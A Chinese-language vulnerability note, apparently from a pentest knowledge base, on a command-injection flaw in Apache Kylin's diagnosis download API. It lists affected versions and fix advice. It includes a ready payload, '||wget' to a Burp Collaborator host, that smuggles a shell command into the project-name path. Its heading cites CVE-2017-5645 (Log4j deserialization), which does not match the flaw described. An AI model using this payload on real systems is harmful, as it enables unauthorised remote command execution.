---
title: Apache-Kylin
---

## 应用简介

[Apache Kylin](http://kylin.apache.org/cn/) 是 eBay 公司开发的一个开源分布式 `OLAP（联机分析处理）` 分析引擎

基于 Hadoop 提供 SQL 接口和 OLAP 接口，支持 TB 到 PB 级别的数据量

被国内外的很多大型互联网企业广泛应用 于 大数据领域 ， 被业界称为大数据分析界的“神兽”

Docker环境：https://github.com/apache/kylin

## [CVE-2017-5645]-Log4j Server 反序列化

**漏洞概述**

```http
#影响范围
Kylin 2.3.0 ~ 2.3.2
Kylin 2.4.0 ~ 2.4.1
Kylin 2.5.0 ~ 2.5.2
Kylin 2.6.0 ~ 2.6.6
Kylin 3.0.0 ~ 3.0.2
```

Kylin的restful API可以将操作系统命令与用户输入的字符串连接起来

由于对用户输入的内容缺少必要的验证，导致攻击者可以远程执行任何系统命令而无需任何验证

**漏洞利用**

```bash
#登陆后访问 System-Configuration-Diagnosis ，触发下载诊断信息的请求
#原始请求：
http://host:port/kylin/api/diag/project/learn_kylin/download

payload：||wget h1j96qoac5o9mbqpkewkhxxa218rwg.burpcollaborator.net||

#替换learn_kylin为以上payload即可
```

**修复建议**

升级到安全版本(3.1.0)：https://kylin.apache.org/download/

注：修复漏洞前请将资料备份，并进行充分测试

**漏洞分析**

https://www.anquanke.com/post/id/210867